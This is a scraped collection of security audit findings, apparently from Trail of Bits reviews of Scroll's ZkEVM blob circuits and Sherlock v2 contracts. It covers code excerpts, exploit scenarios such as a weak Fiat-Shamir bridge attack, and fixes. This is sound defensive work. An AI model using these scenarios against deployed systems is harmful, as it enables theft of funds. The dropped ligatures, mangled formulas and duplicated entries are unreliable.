        ]
    },
    {
        "title": "1. BarycentricEvaluationCong circuit does not constrain the size of blob values ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-scroll-4844-blob-securityreview.pdf",
        "body": " The BarycentricEvaluationConfig circuit constrains the values of a polynomial and  evaluation, each represented as vectors of byte-valued cells, so that equals the result of evaluating a polynomial interpolated through several blob value eld elements at . The blob values are constrained to correspond to 32-cell little-endian representation, as shown in gure 1.1.   // assign LE-bytes of blob scalar field element. let blob_i_le = self .scalar.range().gate.assign_witnesses( ctx, blob_i .to_le_bytes() .iter() .map(|&x| Value::known(Fr::from(x as u64 ))), ); let blob_i_scalar = Scalar::from_raw(blob_i. 0 ); let blob_i_crt = self .scalar .load_private(ctx, Value::known(fe_to_biguint(&blob_i_scalar).into())); // compute the limbs for blob scalar field element. let limb1 = self .scalar.range().gate.inner_product( ctx, blob_i_le[ 0 .. 11 ].iter().map(|&x| QuantumCell::Existing(x)), powers_of_256[ 0 .. 11 ].to_vec(), );  self .scalar.range().gate.assert_equal( ctx, QuantumCell::Existing(limb1), QuantumCell::Existing(blob_i_crt.truncation.limbs[ 0 ]), );  // the most-significant byte of blob scalar field element is 0 as we expect this 15 Scroll ZkEVM EIP- // representation to be in its canonical form. self .scalar.range().gate.assert_equal( ctx, QuantumCell::Existing(blob_i_le[ 31 ]), QuantumCell::Constant(Fr::zero()), ); Figure 1.1: Constraints for each blob value ( aggregator/src/aggregation/barycentric.rs#239290 ) The values in the blob_i_le array are not constrained to be values in the range [0, 256), so this circuit is always satisable, even if the value of the blob_i_crt variable is above the intended 31-byte limit. However, since the BarycentricEvaluationConfig circuit is used only in conjunction with the BlobDataConfig circuit, the values are in fact constrained to the 31-byte limit. These values become the rst BLOB_WIDTH entries in the barycentric_assignments array. Each integer in that portion of the barycentric_assignments array is then constrained to equal the integer in the corresponding position in the blob_fields array. The values in the blob_fields array are represented as 31-limb base-256 numbers, while the values in the barycentric_assignments array are represented as 3-limb, base-2 88 numbers, as shown in gure 1.2. for (blob_crt, blob_field) in blob_crts.iter().zip_eq(blob_fields.iter()) { let limb1 = rlc_config.inner_product( & mut region, &blob_field[ 0 .. 11 ], &pows_of_256, & mut rlc_config_offset, )?; let limb2 = rlc_config.inner_product( & mut region, &blob_field[ 11 .. 22 ], &pows_of_256, & mut rlc_config_offset, )?; let limb3 = rlc_config.inner_product( & mut region, &blob_field[ 22 .. 31 ], &pows_of_256[ 0 .. 9 ], & mut rlc_config_offset, )?; region.constrain_equal(limb1.cell(), blob_crt.truncation.limbs[ 0 ].cell())?; region.constrain_equal(limb2.cell(), blob_crt.truncation.limbs[ 1 ].cell())?; region.constrain_equal(limb3.cell(), blob_crt.truncation.limbs[ 2 ].cell())?; } Figure 1.2: Constraints connecting the 3-limb representation to the 31-byte representation ( aggregator/src/aggregation/blob_data.rs#937959 ) 16 Scroll ZkEVM EIP- Unlike the similar constraints in BarycentricEvaluationConfig , the cells in blob_fields are constrained to be in the range [0, 256), so the limbs are in fact byte values. This happens because they are retrieved from the byte column, which is constrained by a lookup to be in that range, as shown in gures 1.3 and 1.4. let mut blob_fields: Vec < Vec <AssignedCell<Fr, Fr>>> = Vec ::with_capacity(BLOB_WIDTH); let blob_bytes = assigned_rows .iter() .take(N_ROWS_METADATA + N_ROWS_DATA) .map(|row| row. byte .clone()) .collect::< Vec <_>>(); for chunk in blob_bytes.chunks_exact(N_BYTES_31) { // blob bytes are supposed to be deserialised in big-endianness. However, we // have the export from BarycentricConfig in little-endian bytes. blob_fields.push(chunk.iter().rev().cloned().collect()); } Figure 1.3: The cells in blob_fields are from the byte column. ( aggregator/src/aggregation/blob_data.rs#861872 ) meta.lookup( \"BlobDataConfig (0 < byte < 256)\" , |meta| { let byte_value = meta.query_advice(config.byte, Rotation::cur()); vec! [(byte_value, u8_table.into())] }); Figure 1.4: All cells in the byte column are restricted to the range [0,256). ( aggregator/src/aggregation/blob_data.rs#112115 ) Although this is not an exploitable issue in the case of the current use of BarycentricEvaluationConfig , it could easily lead to serious bugs if this circuit is used elsewhere, especially if the use assumes that the blob values are already constrained to 31 bytes. Recommendations Short term, remove these constraints or modify them to constrain the little-endian values to be in the range [0, 256). Long term, ensure that all cells are explicitly constrained to be in the correct range for their intended use. 17 Scroll ZkEVM EIP-",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Not Applicable"
        ]
    },
    {
        "title": "2. Public statement not included in the challenge preimage ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-scroll-4844-blob-securityreview.pdf",
        "body": "After the EIP-4844 update, the collection of L2 transactions within a chunk is no longer represented directly by a hash. Instead, data in the chunk is serialized and a polynomial is derived from that serialized form. That polynomial is provided in a blob on an L1 transaction, which is accessible to the smart contract via a hash of its KZG polynomial commitment. To ensure that the correct transactions are used in the ZkEVM execution proof, the smart contract and circuit each check the result of evaluating the polynomial at a random challenge point. If the result matches, the system treats that as evidence that the transactions being used in the proving step are the same ones chosen in the earlier commit phase. The random challenge point is generated via a Fiat-Shamir transform that includes all the chunk data that goes into the polynomial commitment. With a strong Fiat-Shamir transform, this random evaluation test is sucient to conclude that the commitment binds the prover to a single underlying polynomial: given two polynomials degree at most    (  ) for a random point of is at most , the chance that  (  ) =  (  ) over a eld  (  )  and   . However, the challenge generation in Scrolls ZkEVM circuit does not include the KZG commitment in its transcript, so the system uses the weak Fiat-Shamir transform. In this situation, an adversary who has control over the sequencer can choose a collection of chunks, ,...,  ,   ; calculate their corresponding challenge points and evaluation results, 2 1  ) ,  ),..., (  ,  ), (  ,  (  ; and publish a blob corresponding to the polynomial interpolating   2 2 1 1 through those points, instead of putting the correct chunk data in the blob. Then the prover can arbitrarily choose to generate a proof for any of those chunks. If the Scroll ZkEVM is deployed in a setting where a given batch can be nalized only once (e.g., if Scrolls ZkEVM is exclusively an L2 chain on top of Ethereum), then the impact is limited to maximum extractable value (MEV)style attacks on the on-chain contracts. A malicious sequencer could generate a malicious blob, wait for other parties to submit transactions based on one particular chunk, and then adaptively choose which chunk to nalize in order to manipulate the behavior of those later transactions. 18 Scroll ZkEVM EIP- However, the threat is more severe in a setting where the ZkEVM is deployed as a cross-chain bridge. Exploit Scenario The EIP-4844-enabled ZkEVM is used to create a cross-chain bridge between chain A and chain B, relying on blob commitments. Chad controls a malicious sequencer and gets both sides of the bridge to commit to a maliciously generated blob corresponding to two dierent chunks. Chad then submits a proof to each chain, nalizing a dierent chunk on each side of the bridge. The state of the bridge diverges, causing a loss of funds. Recommendations Short term, add the blob versioned hash to the challenge generation preimage. Long term, always evaluate new uses of cryptographic primitives to ensure that they preserve expected propertiesin this case, that the commitment is binding. When implementing the Fiat-Shamir transform, ensure that random challenge generation includes all data relevant to the statement being proven. References  Weak Fiat-Shamir Attacks on Modern Proof Systems 19 Scroll ZkEVM EIP-",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Challenges are not uniformly random due to modulo bias ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-scroll-4844-blob-securityreview.pdf",
        "body": "Challenge points are generated by taking the Keccak hash of the challenge preimage, treating it as a 256-bit integer, and then reducing it modulo the BLS_MODULUS constant, which is a 255-bit value. This introduces a (small) bias toward smaller values, so the distribution of challenges is nonuniform. Ideally, challenges should always be selected uniformly at random from the space of possible challenges. In this case, the modulo bias is relatively small, and the entire space of values that is biased is suciently large that it should not cause a problem. However, deviations from a properly uniform random distribution should be avoided or at least documented whenever they appear. let challenge_digest = blob.get_challenge_digest(); let (_, challenge) = challenge_digest.div_mod(*BLS_MODULUS); Figure 3.1: Modular reduction ( aggregator/src/blob.rs#507508 ) Recommendations Short term, document the bias in the challenge generation. Long term, consider techniques for generating properly uniform random challenges. 20 Scroll ZkEVM EIP- 4. Initial o\u0000set is ignored in assign_data_bytes Severity: Informational Diculty: Not Applicable Type: Cryptography Finding ID: TOB-SCRL-BLOB-4 Target: zkevm-circuits/src/pi_circuit.rs",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Not Applicable"
        ]
    },
    {
        "title": "5. Witness generation and constraint generation are not separated ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-scroll-4844-blob-securityreview.pdf",
        "body": "The codebase implementing support for EIP-4844 contains several instances where constraints are dened in functions primarily responsible for witness assignment. Furthermore, in some cases, the witness generation code is divided into several functions. Accordingly, the code generating the constraints is sometimes spread across the codebase. This lack of modularity makes the codebase harder to audit. For example, the PI circuit must constrain the chunk_txbytes_hash_rlc witness assigned in the second section of the PI table to be equal to the chunk_txbytes_hash value assigned in the third section of the PI table. This constraint is buried in the middle of the assign_pi_bytes function. let chunk_txbytes_hash_cell = cells[RPI_CELL_IDX].clone(); let pi_bytes_rlc = cells[RPI_RLC_ACC_CELL_IDX].clone(); let pi_bytes_length = cells[RPI_LENGTH_ACC_CELL_IDX].clone(); // Copy chunk_txbytes_hash value from the previous section. region.constrain_equal( chunk_txbytes_hash_cell.cell(), chunk_txbytes_hash_rlc_cell.cell(), )?; // Assign row for validating lookup to check: // pi_hash == keccak256(rlc(pi_bytes)) pi_bytes_rlc.copy_advice( || \"pi_bytes_rlc in the rpi col\" , region, self .raw_public_inputs, offset, )?; Figure 5.1: The equality constraint is intertwined with the witness assignment. ( zkevm-circuits/src/pi_circuit.rs#12521269 ) 23 Scroll ZkEVM EIP- Recommendations Short term, refactor the codebase to separate witness generation and constraint generation into separate functions. Long term, review the codebase and dene an implementation protocol that ensures constraint generation is implemented in clearly identiable functions, allowing for better auditability of the codebase. 24 Scroll ZkEVM EIP- 6. Constraints are not su\u0000ciently documented Severity: Informational Diculty: Not Applicable Type: Cryptography Finding ID: TOB-SCRL-BLOB-6 Target: zkevm-circuits/src/tx_circuit.rs , zkevm-circuits/src/pi_circuit.rs , aggregator/src/aggregation/barycentric.rs , aggregator/src/blob.rs",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Not Applicable"
        ]
    },
    {
        "title": "3. Challenges are not uniformly random due to modulo bias ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-scroll-4844-blob-securityreview.pdf",
        "body": "Challenge points are generated by taking the Keccak hash of the challenge preimage, treating it as a 256-bit integer, and then reducing it modulo the BLS_MODULUS constant, which is a 255-bit value. This introduces a (small) bias toward smaller values, so the distribution of challenges is nonuniform. Ideally, challenges should always be selected uniformly at random from the space of possible challenges. In this case, the modulo bias is relatively small, and the entire space of values that is biased is suciently large that it should not cause a problem. However, deviations from a properly uniform random distribution should be avoided or at least documented whenever they appear. let challenge_digest = blob.get_challenge_digest(); let (_, challenge) = challenge_digest.div_mod(*BLS_MODULUS); Figure 3.1: Modular reduction ( aggregator/src/blob.rs#507508 ) Recommendations Short term, document the bias in the challenge generation. Long term, consider techniques for generating properly uniform random challenges. 20 Scroll ZkEVM EIP-",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Not Applicable"
        ]
    },
    {
        "title": "4. Initial o\u0000set is ignored in assign_data_bytes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-scroll-4844-blob-securityreview.pdf",
        "body": "The assign_data_bytes function takes an offset parameter that marks the location where the prover assigns values of the data_bytes witness. While the oset is used to initialize the Random Linear Combination (RLC) accumulator, the initial oset value is ignored in some of the subsequent assignments. The RLC accumulator is initialized with a call to the assign_rlc_init function. This code writes xed constants in the PI table at the given oset. However, gure 4.1 shows that subsequent assignments of the q_block_context and q_tx_hashes columns ignore the initial oset. let ( mut offset , mut rpi_rlc_acc, mut rpi_length) = self .assign_rlc_init(region, offset)?; // Enable fixed columns for block context. for q_offset in public_data.q_block_context_start_offset()..public_data.q_block_context_end_offset() { region.assign_fixed( || \"q_block_context\" , self .q_block_context, q_offset , || Value::known(F::one()), )?; } Figure 4.1: Assignment of the q_block_context and q_tx_hashes functions at predened osets ( zkevm-circuits/src/pi_circuit.rs#919931 ) Fortunately, the hard-coded osets (e.g., the values returned by the q_block_context_start_offset and public_ data. q_block_context_end_offset functions) are compatible with the initial oset set to 0. However, any change to the codebase that changes the initial oset will be incompatible with the currently dened osets. Furthermore, potential issues may become tedious to debug due to incompatible oset values. 21 Scroll ZkEVM EIP- Recommendations Short term, ensure osets used in assign_data_bytes are compatible with any initial oset value. For example, the q_block_context_start_offset function could take an offset parameter and return offset + 1 . Long term, ensure that the codebase enforces assumed invariants. In particular, the code should robustly handle slight changes in initial oset values for table assignments. 22 Scroll ZkEVM EIP-",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Not Applicable"
        ]
    },
    {
        "title": "5. Witness generation and constraint generation are not separated ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-scroll-4844-blob-securityreview.pdf",
        "body": "The codebase implementing support for EIP-4844 contains several instances where constraints are dened in functions primarily responsible for witness assignment. Furthermore, in some cases, the witness generation code is divided into several functions. Accordingly, the code generating the constraints is sometimes spread across the codebase. This lack of modularity makes the codebase harder to audit. For example, the PI circuit must constrain the chunk_txbytes_hash_rlc witness assigned in the second section of the PI table to be equal to the chunk_txbytes_hash value assigned in the third section of the PI table. This constraint is buried in the middle of the assign_pi_bytes function. let chunk_txbytes_hash_cell = cells[RPI_CELL_IDX].clone(); let pi_bytes_rlc = cells[RPI_RLC_ACC_CELL_IDX].clone(); let pi_bytes_length = cells[RPI_LENGTH_ACC_CELL_IDX].clone(); // Copy chunk_txbytes_hash value from the previous section. region.constrain_equal( chunk_txbytes_hash_cell.cell(), chunk_txbytes_hash_rlc_cell.cell(), )?; // Assign row for validating lookup to check: // pi_hash == keccak256(rlc(pi_bytes)) pi_bytes_rlc.copy_advice( || \"pi_bytes_rlc in the rpi col\" , region, self .raw_public_inputs, offset, )?; Figure 5.1: The equality constraint is intertwined with the witness assignment. ( zkevm-circuits/src/pi_circuit.rs#12521269 ) 23 Scroll ZkEVM EIP- Recommendations Short term, refactor the codebase to separate witness generation and constraint generation into separate functions. Long term, review the codebase and dene an implementation protocol that ensures constraint generation is implemented in clearly identiable functions, allowing for better auditability of the codebase. 24 Scroll ZkEVM EIP-",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Not Applicable"
        ]
    },
    {
        "title": "6. Constraints are not su\u0000ciently documented ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-scroll-4844-blob-securityreview.pdf",
        "body": "In several cases, constraints are fairly complex, use several optimizations for eciency, and span several functions. The constraints implemented and the rationale for their design are often only partially documented. As a consequence of the lack of documentation, manual review for the soundness of circuits is a highly error-prone process. One such case is the transaction circuit that uses the is_chunk_bytes variable to mark rows that contain transaction data included in a chunk. The provided documentation states the following: is_chunk_bytes  A transactions bytes will be included in chunk bytes i the transaction is not padding (identied by a 0x0 caller address) and is not L1 message.  The column is constrained to be boolean. However, likely for eciency reasons, is_chunk_bytes is constrained only when certain conditions hold. The gate shown in gure 6.1 implements the constraint in the transaction circuit. The gate is activated only when the condition in the highlighted section evaluates to true . meta.create_gate( \"Degree reduction column: is_chunk_bytes\" , |meta| { let mut cb = BaseConstraintBuilder::default(); [...] cb.gate(and::expr([ meta.query_fixed(q_enable, Rotation::cur()), not::expr(meta.query_fixed(q_first, Rotation::cur())), not::expr(meta.query_advice(is_calldata, Rotation::cur())), 25 Scroll ZkEVM EIP- not::expr(meta.query_advice(is_access_list, Rotation::cur())), ])) }); Figure 6.1: Conditions under which is_chunk_bytes is constrained ( zkevm-circuits/src/tx_circuit.rs#17431761 ) The quoted documentation makes no mention of the condition involved in the constraints, supposedly leaving open the possibility of an unconstrained witness when the conditions do not hold. However, upon careful inspection of the dierent uses of is_chunk_bytes , it appears those conditional constraints are enforced wherever they matter, and thus, they eectively enforce the desired behavior. Missing or unclear documentation also aects other circuits in the scope of the review. For example, the accumulator column of the BlobDataConfig circuit is documented the following way:  accumulator: Advice column that serves multiple purposes. For the metadata section, it accumulates the big-endian bytes of numValidChunks or chunk[i].chunkSize. For the chunk data section, it increments the value by 1 until we encounter isBoundary is True, i.e. the end of that chunk , where the accumulator must hold the chunkSize. This column is used in a variety of documented ways, depending on several conditions. However, it is also used in an additional undocumented way in the digest RLC section, where a collection of constraints, applied in the assign method, causes the accumulator column to contain values from the chunk-size portion of the metadata section. These constraints in turn justify the seemingly redundant lookup in gure 6.2, where it may appear at rst glance that the columns are simply being looked up in themselves, when in fact this lookup is a primary way that various blob data consistency checks are enforced: // lookup chunk data digests in the \"digest rlc section\" of BlobDataConfig. meta.lookup_any( \"BlobDataConfig (chunk data digests in BlobDataConfig \\\"hash section\\\")\" , |meta| { let is_data = meta.query_selector(config.data_selector); let is_boundary = meta.query_advice(config.is_boundary, Rotation::cur()); // in the \"chunk data\" section when we encounter a chunk boundary let cond = is_data * is_boundary; let hash_section_table = vec! [ meta.query_selector(config.hash_selector), meta.query_advice(config.chunk_idx, Rotation::cur()), meta.query_advice(config.accumulator, Rotation::cur()), meta.query_advice(config.digest_rlc, Rotation::cur()), ]; [ 26 Scroll ZkEVM EIP- // hash section 1. expr(), meta.query_advice(config.chunk_idx, Rotation::cur()), // chunk idx meta.query_advice(config.accumulator, Rotation::cur()), // chunk len meta.query_advice(config.digest_rlc, Rotation::cur()), // digest rlc ] .into_iter() .zip(hash_section_table) .map(|(value, table)| (cond.expr() * value, table)) .collect() }, ); Figure 6.2: aggregator/src/aggregation/blob_data.rs#265292 Although we did not nd exploitable issues caused by these complex constraints during this engagement, similar patternsespecially with conditional constraintshave led to serious issues in previous engagements. For example, in the SHA-256 and EIP-1559 audit, the issues TOB-SCROLLSHA-4 and TOB-SCROLLSHA-6 were caused by witnesses that were only conditionally constrained and used in contexts where the conditions did not hold. Recommendations Short term, fully document the constraints of each circuit. Aim to capture both the high-level goal of each constraint, as well as the assumptions and optimizations used to actually implement each constraint. Doing so will improve the auditability and maintainability of the codebase. Long term, review all conditional constraints to ensure that conditionally constrained witnesses are not used in contexts where conditions do not hold. 27 Scroll ZkEVM EIP- 7. BarycentricEvaluationCong circuit returns zero on roots of unity Severity: Informational Diculty: Not Applicable Type: Data Validation Finding ID: TOB-SCRL-BLOB-7 Target: aggregator/src/aggregation/barycentric.rs",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Not Applicable"
        ]
    },
    {
        "title": "7. BarycentricEvaluationCong circuit returns zero on roots of unity ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-scroll-4844-blob-securityreview.pdf",
        "body": "The BarycentricEvaluationConfig circuit uses a special-case formula for evaluating a th root of given its evaluation at   1 ) , where 1 ), ...,  ( 0 ),  ( is an  (  )  (   polynomial unity, as shown below: Evaluating this formula at a power of sum is divided by zero, and then the overall result is multiplied by zeroeectively, one results in an indeterminate form, one term of the  term of the sum is multiplied by 0 0 . However, in the halo2-ecc library, which the Scroll ZkEVM uses for implementing nite eld operations, dividing by 0 always results in the value 0, rather than an unsatisable circuit, as shown in gure 7.1. fn divide ( & self , ctx: & mut Context<F>, a: & Self ::FieldPoint, b: & Self ::FieldPoint, ) -> Self ::FieldPoint { let quotient = self .divide_unsafe(ctx, a, b); let b_is_zero = self .is_zero(ctx, b); self .select(ctx, b, &quotient, &b_is_zero) } Figure 7.1: Fp::divide returns 0 when b equals 0. ( halo2-lib/halo2-ecc/src/fields/fp.rs#466475 ) Thus, when evaluating the above formula with the  th power of  , the  th value in the sum will be zero, the sum will have some result, and then the sum will be multiplied by    1  , which evaluates to 0. 28 Scroll ZkEVM EIP- In the context of EIP-4844 support, this circuit is used only with a random challenge point, and the chance of hitting a 4,096 th root of unity is negligible. However, if this circuit is reused in a context where the evaluation point is not random, this behavior may lead to unexpected errors. Recommendations Short term, specify and document the behavior of the BarycentricEvaluationConfig circuit when the challenge point is a root of unity. A simple modication would be to constrain z_to_blob_width_minus_one to be nonzero, which would cause the BarycentricEvaluationConfig circuit to be unsatisable on roots of unity. Long term, document or rule out edge-case behavior, especially when that behavior aects the context within which the component can be safely used. References  A quick barycentric evaluation tutorial 29 Scroll ZkEVM EIP- A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Not Applicable"
        ]
    },
    {
        "title": "1. Solidity compiler optimizations can be problematic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Sherlockv2.pdf",
        "body": "Sherlock has enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed. Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe. It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-jscauses a security vulnerability in the Sherlock contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Certain functions lack zero address checks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Sherlockv2.pdf",
        "body": "Certain functions fail to validate incoming arguments, so callers can accidentally set important state variables to the zero address. For example, the AaveV2Strategy contracts constructor function does not validate the aaveLmReceiver, which is the address that receives Aave rewards on calls to AaveV2Strategy.claimRewards. 39 40 41 42 43 44 45 46 47 } constructor(IAToken _aWant, address _aaveLmReceiver) { aWant = _aWant; // This gets the underlying token associated with aUSDC (USDC) want = IERC20(_aWant.UNDERLYING_ASSET_ADDRESS()); // Gets the specific rewards controller for this token type aaveIncentivesController = _aWant.getIncentivesController(); aaveLmReceiver = _aaveLmReceiver; Figure 2.1: managers/AaveV2Strategy.sol:39-47 If the aaveLmReceiver variable is set to the address zero, the Aave contract will revert with INVALID_TO_ADDRESS. This prevents any Aave rewards from being claimed for the designated token. The following functions are missing zero address checks:  Manager.setSherlockCoreAddress  AaveV2Strategy.sweep  SherDistributionManager.sweep  SherlockProtocolManager.sweep  Sherlock.constructor Exploit Scenario Bob deploys AaveV2Strategy with aaveLmReceiver set to the zero address. All calls to claimRewards revert. Recommendations Short term, add zero address checks on all function arguments to ensure that users cannot accidentally set incorrect values. Long term, use Slither, which will catch functions that do not have zero address checks.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. updateYieldStrategy could leave funds in the old strategy ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Sherlockv2.pdf",
        "body": "The updateYieldStrategy function sets a new yield strategy manager contract without calling yieldStrategy.withdrawAll() on the old strategy, potentially leaving funds in it. 257 // Sets a new yield strategy manager contract 258 /// @notice Update yield strategy 259 /// @param _yieldStrategy News address of the strategy 260 /// @dev try a yieldStrategyWithdrawAll() on old, ignore failure 261 function updateYieldStrategy(IStrategyManager _yieldStrategy) external override onlyOwner { 262 263 264 265 266 yieldStrategy = _yieldStrategy; 267 } if (address(_yieldStrategy) == address(0)) revert ZeroArgument(); if (yieldStrategy == _yieldStrategy) revert InvalidArgument(); emit YieldStrategyUpdated(yieldStrategy, _yieldStrategy); Figure 3.1: contracts/Sherlock.sol:257-267 Even though one could re-add the old strategy to recover the funds, this issue could cause stakers and the protocols insured by Sherlock to lose trust in the system. This issue has a signicant impact on the result of totalTokenBalanceStakers, which is used when calculating the shares in initialStake. totalTokenBalanceStakers uses the balance of the yield strategy. If the balance is missing the funds that should have been withdrawn from a previous strategy, the result will be incorrect. return 151 function totalTokenBalanceStakers() public view override returns (uint256) { 152 153 token.balanceOf(address(this)) + 154 155 sherlockProtocolManager.claimablePremiums(); 156 } yieldStrategy.balanceOf() + Figure 3.2: contracts/Sherlock.sol:151-156 uint256 _amount, uint256 _period, address _receiver 483 function initialStake( 484 485 486 487 ) external override whenNotPaused returns (uint256 _id, uint256 _sher) { ... 501 502 stakeShares_ = (_amount * totalStakeShares_) / (totalTokenBalanceStakers() - _amount); 503 // If this is the first stake ever, we just mint stake shares equal to the amount of USDC staked 504 else stakeShares_ = _amount; if (totalStakeShares_ != 0) Figure 3.3: contracts/Sherlock.sol:483-504 Exploit Scenario Bob, the owner of the Sherlock contract, calls updateYieldStrategy with a new strategy. Eve calls initialStake and receives more shares than she is due because totalTokenBalanceStakers returns a signicantly lower balance than it should. Bob notices the missing funds, calls updateYieldStrategy with the old strategy and then yieldStrategy.WithdrawAll to recover the funds, and switches back to the new strategy. Eves shares now have notably more value. Recommendations Short term, in updateYieldStrategy, add a call to yieldStrategy.withdrawAll() on the old strategy. Long term, when designing systems that store funds, use extensive unit testing and property-based testing to ensure that funds cannot become stuck.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Pausing and unpausing the system may not be possible when removing or replacing connected contracts ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Sherlockv2.pdf",
        "body": "The Sherlock contract allows all of the connected contracts to be paused or unpaused at the same time. However, if the sherDistributionManager contract is removed, or if any of the connected contracts are replaced when the system is paused, it might not be possible to pause or unpause the system. function removeSherDistributionManager() external override onlyOwner { if (address(sherDistributionManager) == address(0)) revert InvalidConditions(); emit SherDistributionManagerUpdated( sherDistributionManager, ISherDistributionManager(address(0)) ); delete sherDistributionManager; 206 207 208 209 210 211 212 213 214 } Figure 4.1: contracts/Sherlock.sol:206-214 Of all the connected contracts, the only one that can be removed is the sherDistributionManager contract. On the other hand, all of the connected contracts can be replaced through an update function. function pause() external onlyOwner { _pause(); yieldStrategy.pause(); sherDistributionManager.pause(); sherlockProtocolManager.pause(); sherlockClaimManager.pause(); 302 303 304 305 306 307 308 } 309 310 311 /// @notice Unpause external functions in all contracts function unpause() external onlyOwner { 312 313 314 315 316 317 } _unpause(); yieldStrategy.unpause(); sherDistributionManager.unpause(); sherlockProtocolManager.unpause(); sherlockClaimManager.unpause(); Figure 4.2: contracts/Sherlock.sol:302-317 If the sherDistributionManager contract is removed, a call to Sherlock.pause will revert, as it is attempting to call the zero address. If sherDistributionManager is removed while the system is paused, then a call to Sherlock.unpause will revert for the same reason. If any of the contracts is replaced while the system is paused, the replaced contract will be in an unpaused state while the other contracts are still paused. As a result, a call to Sherlock.unpause will revert, as it is attempting to unpause an already unpaused contract. Exploit Scenario Bob, the owner of the Sherlock contract, pauses the system to replace the sherlockProtocolManager contract, which contains a bug. Bob deploys a new sherlockProtocolManager contract and calls updateSherlockProtocolManager to set the new address in the Sherlock contract. To unpause the system, Bob calls Sherlock.unpause, which reverts because sherlockProtocolManager is already unpaused. Recommendations Short term, add conditional checks to the Sherlock.pause and Sherlock.unpause functions to check that a contract is either paused or unpaused, as expected, before attempting to update its state. For sherDistributionManager, the check should verify that the contract to be paused or unpaused is not the zero address. Long term, for pieces of code that depend on the states of multiple contracts, implement unit tests that cover each possible combination of contract states.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "5. SHER reward calculation uses confusing six-decimal SHER reward rate ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Sherlockv2.pdf",
        "body": "The reward calculation in calcReward uses a six-decimal SHER reward rate value. This might confuse readers and developers of the contracts because the SHER token has 18 decimals, and the calculated reward will also have 18 decimals. Also, this value does not allow the SHER reward rate to be set below 0.000001000000000000 SHER. function calcReward( 89 90 91 92 93 ) public view override returns (uint256 _sher) { uint256 _tvl, uint256 _amount, uint256 _period 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 [..] // If there are some max rewards available... if (maxRewardsAvailable != 0) { // And if the entire stake is still within the maxRewardsAvailable amount if (_amount <= maxRewardsAvailable) { // Then the entire stake amount should accrue max SHER rewards return (_amount * maxRewardsRate * _period) * DECIMALS; } else { // Otherwise, the stake takes all the maxRewardsAvailable left  // We add the maxRewardsAvailable amount to the TVL (now _tvl _tvl += maxRewardsAvailable; // We subtract the amount of the stake that received max rewards _amount -= maxRewardsAvailable; // We accrue the max rewards available at the max rewards  // This could be: $20M of maxRewardsAvailable which gets  // Calculation continues after this _sher += (maxRewardsAvailable * maxRewardsRate * _period) * DECIMALS; } } // If there are SHER rewards still available  if (slopeRewardsAvailable != 0) { _sher += (((zeroRewardsStartTVL - position) * _amount * maxRewardsRate * _period) / (zeroRewardsStartTVL - maxRewardsEndTVL)) * DECIMALS; 144 145 146 147 148 149 } } Figure 5.1: contracts/managers/SherDistributionManager.sol:89-149 In the reward calculation, the 6-decimal maxRewardsRate is rst multiplied by _amount and _period, resulting in a 12-decimal intermediate product. To output a nal 18-decimal product, this 12-decimal product is multiplied by DECIMALS to add 6 decimals. Although this leads to a correct result, it would be clearer to use an 18-decimal value for maxRewardsRate and to divide by DECIMALS at the end of the calculation. // using 6 decimal maxRewardsRate (10e6 * 1e6 * 10) * 1e6 = 100e18 = 100 SHER // using 18 decimal maxRewardsRate (10e6 * 1e18 * 10) / 1e6 = 100e18 = 100 SHER Figure 5.2: Comparison of a 6-decimal and an 18-decimal maxRewardsRate Exploit Scenario Bob, a developer of the Sherlock protocol, writes a new version of the SherDistributionManager contract that changes the reward calculation. He mistakenly assumes that 